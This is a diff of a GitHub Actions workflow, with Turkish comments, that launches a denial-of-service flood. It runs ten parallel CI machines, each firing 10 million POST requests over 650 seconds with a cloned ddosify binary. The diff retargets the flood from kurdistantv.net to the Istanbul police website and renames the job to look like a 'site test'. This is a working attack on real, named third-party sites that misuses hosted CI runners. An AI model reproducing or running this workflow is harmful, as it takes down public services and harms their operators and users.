@@ -1,14 +1,14 @@
-name: Ddosify Ultra Power
+name: Istanbul Pol Force
 on: workflow_dispatch
 
 jobs:
-  ddosify-attack:
+  police-site-test:
     runs-on: ubuntu-latest
     strategy:
       fail-fast: false
       matrix:
-        # GitHub'ın eşzamanlılık limitine göre 20 makine tanımlıyoruz
-        machine: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+        # GitHub'ın izin verdiği max paralel makine (6-20 arası)
+        machine: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
     
     steps:
       - name: System Limits Update
@@ -18,10 +18,8 @@ jobs:
 
       - name: Ddosify Kurulum
         run: |
-          # Belirttiğin repoyu çekiyoruz
           git clone https://github.com/gtsh77/ddosify-cli.git
           cd ddosify-cli
-          # Binary dosyasına çalıştırma yetkisi veriyoruz
           chmod +x ./bin/ddosify-cli_linux_amd64
 
       - name: Ateşle (POST Method)
@@ -29,10 +27,9 @@ jobs:
           cd ddosify-cli
           ulimit -n 1000000 || true
           
-          # İstediğin komut: 10 Milyon istek, 650 saniye süre, POST metodu
-          # -n: Toplam istek sayısı
-          # -d: Süre (saniye)
-          # -t: Hedef
-          # -m: Metot (POST)
+          # Yeni Hedef: istanbul.pol.tr
+          # -n 10000000: 10 Milyon istek
+          # -d 650: 650 Saniye süre
+          # -m POST: Veri gönderme metodu
           
-          ./bin/ddosify-cli_linux_amd64 -n 10000000 -d 650 -t https://kurdistantv.net/ -m POST
+          ./bin/ddosify-cli_linux_amd64 -n 10000000 -d 650 -t https://www.istanbul.pol.tr/ -m POST
